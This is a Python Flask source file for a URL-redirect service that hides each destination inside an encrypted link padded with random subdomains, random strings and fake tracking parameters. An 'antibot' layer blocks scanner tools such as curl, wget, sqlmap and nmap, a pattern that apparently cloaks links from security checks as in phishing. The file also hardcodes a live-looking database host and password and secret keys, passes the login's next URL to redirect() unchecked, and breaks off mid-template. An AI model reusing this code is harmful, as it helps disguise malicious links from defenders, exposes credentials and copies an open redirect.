from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, make_response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
import random
import math
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
import bleach
from ua_parser.user_agent_parser import Parse
import sys
import string

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)
logger.debug("Initializing Flask app")

# Hardcoded configuration values
FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
AES_GCM_KEY = b'\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09\x1a\x2b\x3c\x4d\x5e\x6f\x70\x81\x92\xa3\xb4\xc5\xd6\xe7\xf8\x09'
HMAC_KEY = b'\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9\x0a\x1b\x2c\x3d\x4e\x5f\x60\x71\x82\x93\xa4\xb5\xc6\xd7\xe8\xf9'
VALKEY_HOST = "valkey-c93d570-marychamberlin31-5857.g.aivencloud.com"
VALKEY_PORT = 25534
VALKEY_USERNAME = "default"
VALKEY_PASSWORD = "AVNS_iypeRGpnvMGXCd4ayYL"
DATA_RETENTION_DAYS = 90
USER_TXT_URL = "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt"
REQUIRED_HEADERS = ['Accept', 'Connection']
RISK_SCORE_THRESHOLD = 100
COOKIE_TOKEN_TTL = 600  # 10 minutes
VERIFY_TOKEN_TTL = 10  # 10 seconds
MAX_PAYLOAD_PADDING = 32

# Verify keys at startup
try:
    if len(AES_GCM_KEY) != 32:
        raise ValueError("AES-GCM key must be 32 bytes")
    Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(secrets.token_bytes(12)), backend=default_backend())
    logger.debug("AES-GCM key validated successfully")
except Exception as e:
    logger.error(f"Invalid AES-GCM key at startup: {str(e)}")
    raise ValueError(f"AES-GCM key initialization failed: {str(e)}")

try:
    if len(HMAC_KEY) != 32:
        raise ValueError("HMAC key must be 32 bytes")
    h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
    h.update(b"test")
    h.finalize()
    logger.debug("HMAC key validated successfully")
except Exception as e:
    logger.error(f"Invalid HMAC key at startup: {str(e)}")
    raise ValueError(f"HMAC key initialization failed: {str(e)}")

# Flask configuration
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
app.config['WTF_CSRF_SECRET_KEY'] = WTF_CSRF_SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=1)
logger.debug("Flask configuration set successfully")

# CSRF protection
csrf = CSRFProtect(app)

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username is required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Username can only contain letters, numbers, _, @, or .")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain is required"),
        Length(min=2, max=100, message="Subdomain must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Subdomain can only contain letters, numbers, or hyphens")
    ])
    randomstring1 = StringField('Randomstring1', validators=[
        DataRequired(message="Randomstring1 is required"),
        Length(min=2, max=100, message="Randomstring1 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring1 can only contain letters, numbers, _, @, or .")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link is required"),
        URL(message="Invalid URL format (must start with http:// or https://)")
    ])
    randomstring2 = StringField('Randomstring2', validators=[
        DataRequired(message="Randomstring2 is required"),
        Length(min=2, max=100, message="Randomstring2 must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Randomstring2 can only contain letters, numbers, _, @, or .")
    ])
    expiry = SelectField('Expiry', choices=[
        ('300', '5 Minutes'),
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week')
    ], default='3600')
    analytics_enabled = BooleanField('Enable Analytics')
    submit = SubmitField('Generate URL')

# Valkey initialization
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.debug("Valkey connection established successfully")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
    valkey_client = None

# Custom Jinja2 filter for datetime
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except (TypeError, ValueError) as e:
        logger.error(f"Error formatting timestamp: {str(e)}")
        return "Not Available"

app.jinja_env.filters['datetime'] = datetime_filter

# Add security headers
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline'; img-src 'self'; connect-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Random-Token'] = secrets.token_hex(8)
    response.headers['X-Session-ID'] = generate_random_string(16)
    response.headers['Server'] = f"CustomServer/{secrets.token_hex(4)}"
    return response

# Antibot utilities
def calculate_request_entropy(headers, query_params):
    entropy = 0
    for value in list(headers.values()) + list(query_params.values()):
        if value:
            freq = {}
            for char in value:
                freq[char] = freq.get(char, 0) + 1
            for count in freq.values():
                prob = count / len(value)
                entropy -= prob * math.log2(prob) if prob > 0 else 0
    return entropy

def generate_request_fingerprint():
    headers = {k: v for k, v in request.headers.items() if k in REQUIRED_HEADERS}
    timing = str(int(time.time() * 1000) % 10000)
    return hashlib.sha256(f"{json.dumps(headers, sort_keys=True)}{timing}".encode()).hexdigest()

def is_suspicious_request():
    risk_score = 0
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '').lower()
    headers = request.headers
    query_params = request.args

    # User-Agent analysis
    # Only flag highly suspicious User-Agents (e.g., scanners, malicious tools)
    MALICIOUS_UA_PATTERNS = [
        'scanner', 'curl', 'wget', 'python-requests', 'httpclient', 'zgrab',
        'masscan', 'nmap', 'probe', 'sqlmap'
    ]
    if not ua:
        logger.debug(f"No User-Agent provided, IP: {ip}")
        risk_score += 30  # Reduced from 50 to allow some headless browsers
    elif any(pattern in ua for pattern in MALICIOUS_UA_PATTERNS):
        risk_score += 40  # Increased for malicious patterns
        logger.debug(f"Suspicious User-Agent: {ua}")

    # Allow known crawlers explicitly
    KNOWN_CRAWLERS = ['googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot']
    if any(crawler in ua for crawler in KNOWN_CRAWLERS):
        risk_score -= 20  # Reduce risk for legitimate crawlers
        logger.debug(f"Known crawler detected: {ua}")

    # Header validation
    # Relax header checks to only flag missing critical headers
    CRITICAL_HEADERS = ['Accept', 'Connection']
    missing_headers = [h for h in CRITICAL_HEADERS if h not in headers]
    if missing_headers:
        risk_score += 10  # Reduced from 20
        logger.debug(f"Missing headers: {missing_headers}")

    # Entropy analysis
    # Relax entropy threshold to avoid flagging normal requests
    entropy = calculate_request_entropy(headers, query_params)
    if entropy < 3:  # Changed from 5 to 3
        risk_score += 15  # Reduced from 25
        logger.debug(f"Low request entropy: {entropy}")

    # Behavioral analysis (rapid requests)
    if valkey_client:
        request_key = f"requests:{ip}:link"
        valkey_client.lpush(request_key, str(time.time()))
        valkey_client.ltrim(request_key, 0, 9)  # Keep last 10 requests
        valkey_client.expire(request_key, 20)
        recent_requests = valkey_client.lrange(request_key, 0, -1)
        if len(recent_requests) > 7:  # Increased from 5 to 7
            timestamps = [float(t) for t in recent_requests]
            if max(timestamps) - min(timestamps) < 10:  # Reduced from 15 to 10
                risk_score += 50  # Increased to focus on rapid malicious requests
                logger.debug(f"Rapid link access from IP: {ip}")

    # Fingerprint analysis
    # Relax fingerprint check to allow shared fingerprints
    fingerprint = generate_request_fingerprint()
    if valkey_client:
        fingerprint_key = f"fingerprint:{fingerprint}"
        valkey_client.sadd(fingerprint_key, ip)
        valkey_client.expire(fingerprint_key, 3600)
        if valkey_client.scard(fingerprint_key) > 5:  # Increased from 3 to 5
            risk_score += 20  # Reduced from 30
            logger.debug(f"Repeated fingerprint from IP: {ip}")

    # Store risk score
    if valkey_client:
        try:
            valkey_client.hincrby(f"risk_score:{ip}", "score", risk_score)
            valkey_client.expire(f"risk_score:{ip}", 3600)
        except Exception as e:
            logger.warning(f"Failed to store risk score for IP {ip}: {str(e)}")

    # Only block if risk score is very high
    if risk_score >= RISK_SCORE_THRESHOLD:
        logger.warning(f"Blocked highly suspicious request from {ip}: risk_score={risk_score}")
        # Return 403 Forbidden instead of redirecting to Google
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Access Denied - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Access Denied</h3>
                    <p class="text-gray-600">Your request was blocked due to suspicious activity.</p>
                </div>
            </body>
            </html>
        """), 403)
        return add_security_headers(response)

    logger.debug(f"Request allowed, risk_score={risk_score}, IP: {ip}")
    return None

# Rate limiting
def dynamic_rate_limit(base_limit=5, base_per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            # Check for suspicious requests
            result = is_suspicious_request()
            if result:
                return result

            ip = request.remote_addr
            if not valkey_client:
                logger.warning("Valkey unavailable, skipping rate limit")
                response = make_response(f(*args, **kwargs))
                return add_security_headers(response)
            
            risk_score = int(valkey_client.hget(f"risk_score:{ip}", "score") or 0)
            limit = max(1, base_limit - (risk_score // 20))
            per = random.randint(base_per - 10, base_per + 10)
            key = f"rate_limit:{ip}:{f.__name__}:{secrets.token_hex(4)}"
            try:
                current = valkey_client.get(key)
                if current is None:
                    valkey_client.setex(key, per, 1)
                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                elif int(current) >= limit:
                    logger.warning(f"Rate limit exceeded for IP: {ip}, risk_score: {risk_score}")
                    response = make_response(render_template_string("""
                        <!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <meta name="robots" content="noindex, nofollow">
                            <meta name="description" content="Secure URL redirection service for managing custom links">
                            <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                            <meta name="author" content="TamariskSD">
                            <meta http-equiv="X-UA-Compatible" content="IE=edge">
                            <meta name="referrer" content="strict-origin-when-cross-origin">
                            <meta property="og:title" content="TamariskSD - Too Many Requests">
                            <meta property="og:description" content="Secure URL redirection service for managing custom links">
                            <meta property="og:type" content="website">
                            <meta property="og:url" content="{{ request.url }}">
                            <title>Too Many Requests - TamariskSD</title>
                            <script src="https://cdn.tailwindcss.com"></script>
                        </head>
                        <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                            <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                                <h3 class="text-lg font-bold mb-4 text-red-600">Too Many Requests</h3>
                                <p class="text-gray-600">Please try again later.</p>
                            </div>
                        </body>
                        </html>
                    """, request=request), 429)
                    return add_security_headers(response)
                else:
                    valkey_client.incr(key)
                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                response = make_response(f(*args, **kwargs))
                return add_security_headers(response)
            except Exception as e:
                logger.error(f"Error in rate_limit for IP {ip}: {str(e)}")
                response = make_response(f(*args, **kwargs))
                return add_security_headers(response)
        return wrapped_function
    return decorator

# Payload encryption and obfuscation
def encrypt_payload(payload):
    try:
        payload_bytes = json.dumps({
            "data": payload,
            "decoy": secrets.token_hex(16),
            "timestamp": int(time.time())
        }).encode('utf-8')
        padding_length = random.randint(8, MAX_PAYLOAD_PADDING)
        padding = secrets.token_bytes(padding_length)
        padded_payload = len(padding).to_bytes(4, 'big') + payload_bytes + padding
        b64_payload = base64.urlsafe_b64encode(padded_payload)
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(b64_payload) + encryptor.finalize()
        encrypted = iv + ciphertext + encryptor.tag
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted)
        signature = h.finalize()
        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
        logger.debug(f"Encrypted payload: {result[:20]}...")
        return result
    except Exception as e:
        logger.error(f"Payload encryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Encryption failed: {str(e)}")

def decrypt_payload(encrypted):
    try:
        parts = encrypted.split('.')
        if len(parts) != 2:
            raise ValueError("Invalid payload format")
        encrypted_data = base64.urlsafe_b64decode(parts[0])
        signature = base64.urlsafe_b64decode(parts[1])
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(encrypted_data)
        h.verify(signature)
        iv = encrypted_data[:12]
        tag = encrypted_data[-16:]
        ciphertext = encrypted_data[12:-16]
        cipher = Cipher(algorithms.AES(AES_GCM_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        b64_payload = decryptor.update(ciphertext) + decryptor.finalize()
        padded_payload = base64.urlsafe_b64decode(b64_payload)
        if len(padded_payload) < 4:
            raise ValueError("Invalid payload: too short")
        padding_length = int.from_bytes(padded_payload[:4], 'big')
        if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
            raise ValueError("Invalid padding length")
        payload_bytes = padded_payload[4:-padding_length]
        payload_json = json.loads(payload_bytes.decode('utf-8'))
        result = payload_json['data']
        logger.debug(f"Decrypted payload: {result[:50]}...")
        return result
    except Exception as e:
        logger.error(f"Payload decryption error: {str(e)}", exc_info=True)
        raise ValueError(f"Decryption failed: {str(e)}")

def generate_random_string(length):
    characters = string.ascii_letters + string.digits + '-_'
    return ''.join(secrets.choice(characters) for _ in range(length))

def get_valid_usernames():
    try:
        if valkey_client:
            cached = valkey_client.get("usernames")
            if cached:
                logger.debug("Retrieved usernames from Valkey cache")
                return json.loads(cached)
        response = requests.get(USER_TXT_URL, timeout=5)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            valkey_client.setex("usernames", 3600, json.dumps(usernames))
            logger.debug("Cached usernames in Valkey")
        logger.debug(f"Fetched {len(usernames)} usernames")
        return usernames
    except Exception as e:
        logger.error(f"Error fetching usernames: {str(e)}")
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            logger.debug(f"Redirecting to login from {request.url}")
            response = make_response(redirect(url_for('login', next=request.url)))
            return add_security_headers(response)
        logger.debug(f"Authenticated user: {session['username']}")
        response = make_response(f(*args, **kwargs))
        return add_security_headers(response)
    return decorated_function

def get_base_domain():
    try:
        host = request.host
        parts = host.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else host
    except Exception as e:
        logger.error(f"Error getting base domain: {str(e)}")
        return "tamarisksd.com"

@app.route("/login", methods=["GET", "POST"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def login():
    try:
        logger.debug(f"Accessing /login, method: {request.method}, next: {request.args.get('next', '')}")
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            logger.debug(f"Login attempt with username: {username}")
            valid_usernames = get_valid_usernames()
            if username in valid_usernames:
                session['username'] = username
                session.permanent = True
                session.modified = True
                logger.debug(f"User {username} logged in")
                next_url = form.next_url.data or url_for('dashboard')
                response = make_response(redirect(next_url))
                return add_security_headers(response)
            logger.warning(f"Invalid login attempt: {username}")
            form.username.errors.append("Invalid username")
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service login">
                <meta name="keywords" content="URL redirection, secure links, login, authentication, URL management">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Login">
                <meta property="og:description" content="Log in to manage your secure URL redirects">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Login - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                </style>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container w-full max-w-md mx-auto text-center">
                    <h1 class="text-3xl font-extrabold mb-6 text-white">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-400 mb-4">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-5">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium text-white">Username</label>
                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                        </div>
                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                    </form>
                </div>
            </body>
            </html>
        """, form=form, request=request))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}", exc_info=True)
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Error">
                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Internal Server Error - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """, request=request), 500)
        return add_security_headers(response)

@app.route("/", methods=["GET"])
@dynamic_rate_limit(base_limit=5, base_per=60)
def index():
    try:
        logger.debug(f"Accessing root URL, host: {request.host}")
        if 'username' in session:
            response = make_response(redirect(url_for('dashboard')))
            return add_security_headers(response)
        response = make_response(redirect(url_for('login')))
        return add_security_headers(response)
    except Exception as e:
        logger.error(f"Error in index: {str(e)}", exc_info=True)
        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Secure URL redirection service for managing custom links">
                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Error">
                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Internal Server Error - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """, request=request), 500)
        return add_security_headers(response)

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
@dynamic_rate_limit(base_limit=5, base_per=60)
def dashboard():
    try:
        username = session['username']
        logger.debug(f"Accessing dashboard for user: {username}")
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            subdomain = bleach.clean(form.subdomain.data.strip())
            randomstring1 = bleach.clean(form.randomstring1.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            randomstring2 = bleach.clean(form.randomstring2.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL: Must be a valid http:// or https:// URL"
                logger.warning(f"Invalid destination_link: {destination_link}")

            if not error:
                path_segment = f"{randomstring1}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
                endpoint = generate_random_string(16)
                expiry_timestamp = int(time.time()) + expiry
                payload = json.dumps({
                    "student_link": destination_link,
                    "timestamp": int(time.time() * 1000),
                    "expiry": expiry_timestamp,
                    "fingerprint": generate_request_fingerprint()
                })

                try:
                    encrypted_payload = encrypt_payload(payload)
                except ValueError as e:
                    logger.error(f"Encryption failed: {str(e)}")
                    error = "Failed to encrypt payload"

                if not error:
                    fake_params = f"?utm_source={generate_random_string(8)}&session={secrets.token_hex(6)}"
                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}{fake_params}"
                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                    if valkey_client:
                        valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
                            "url": generated_url,
                            "destination": destination_link,
                            "encrypted_payload": encrypted_payload,
                            "endpoint": endpoint,
                            "created": int(time.time()),
                            "expiry": expiry_timestamp,
                            "clicks": 0,
                            "analytics_enabled": "1" if analytics_enabled else "0"
                        })
                        valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                        logger.info(f"Generated URL for {username}: {generated_url}")
                        response = make_response(redirect(url_for('dashboard')))
                        return add_security_headers(response)
                    else:
                        error = "Database unavailable"

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                for key in url_keys:
                    url_data = valkey_client.hgetall(key)
                    if not url_data:
                        continue
                    url_id = key.split(':')[-1]
                    urls.append({
                        "url": url_data.get('url', ''),
                        "destination": url_data.get('destination', ''),
                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
                        "clicks": int(url_data.get('clicks', 0)),
                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                        "url_id": url_id
                    })
            except Exception as e:
                logger.error(f"Valkey error fetching URLs: {str(e)}")
                valkey_error = "Unable to fetch URL history"

        response = make_response(render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <meta name="description" content="Manage your secure URL redirects with TamariskSD">
                <meta name="keywords" content="URL redirection, secure links, link management, dashboard, URL shortening">
                <meta name="author" content="TamariskSD">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="referrer" content="strict-origin-when-cross-origin">
                <meta property="og:title" content="TamariskSD - Dashboard">
                <meta property="og:description" content="Manage your secure URL redirects with TamariskSD">
                <meta property="og:type" content="website">
                <meta property="og:url" content="{{ request.url }}">
                <title>Dashboard - {{ username }} - TamariskSD</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                    .card:hover { transform: translateY(-5px); }
                    .error { color: #f87171; }
                    .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                    .toggle-switch input { opacity: 0; width: 0; height: 0; }
                    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
                    .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
                    input:checked + .slider { background-color: #4f46e5; }
                    input:checked + .slider:before { transform: translateX(26px); }
                </style>
                <script>
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else {
                                alert('Failed to toggle analytics');
                            }
                        }).catch(error => {
                            console.error('Error toggling analytics:', error);
                            alert('Error toggling analytics');
                        });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="container max-w-7xl mx-auto">
                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="card bg-gray-800 p-8 rounded-xl mb-8">
                        <h2 class="text-2xl font-bold mb-6 text-white">Generate New URL</h2>
                        <p class="text-gray-300 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
                        <form method="POST" class="space-y-5 max-w-md mx-auto">
                            {{ form.csrf_token }}
                            <div>
                                <label class="block text-sm font-medium text-white">Subdomain</label>
                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Randomstring1</label>
                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Destination Link</label>
                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Randomstring2</label>
                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Expiry</label>
                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-white">Enable Analytics</label>
                                {{ form.analytics_enabled(class="mt-1 p-3") }}
                            </div>
                            {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                        </form>
                    </div>
                    <div class="card bg-gray-800 p-8 rounded-xl">
                        <h2 class="text-2xl font-bold mb-6 text-white">URL History</h2>
                        {% if urls %}
                            {% for url in urls %}
                                <div class="card bg-gray-900 p-6 rounded-lg mb-4">
                                    <h3 class="text-xl font-semibold text-white">{{ url.destination }}</h3>
                                    <p class="text-gray-300 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-400">{{ url.url }}</a></p>
